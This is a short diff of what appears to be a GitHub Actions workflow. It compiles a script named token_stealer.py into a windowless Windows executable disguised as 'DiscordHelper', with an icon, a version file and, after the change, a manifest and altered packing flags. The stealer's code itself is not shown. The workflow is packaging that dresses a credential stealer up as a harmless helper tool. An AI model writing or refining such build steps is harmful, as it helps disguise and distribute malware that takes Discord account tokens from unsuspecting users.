@@ -9,7 +9,7 @@ jobs:
         with:
           python-version: '3.12'
       - run: pip install pyinstaller requests pywin32 cryptography
-      - run: pyinstaller --onefile --noconsole --name "DiscordHelper" --icon app.ico --version-file version.txt token_stealer.py
+      - run: pyinstaller --onefile --noupx --clean --noconsole --name "DiscordHelper" --icon app.ico --version-file version.txt --manifest manifest.xml token_stealer.py
       - uses: actions/upload-artifact@v4
         with:
           name: DiscordHelper
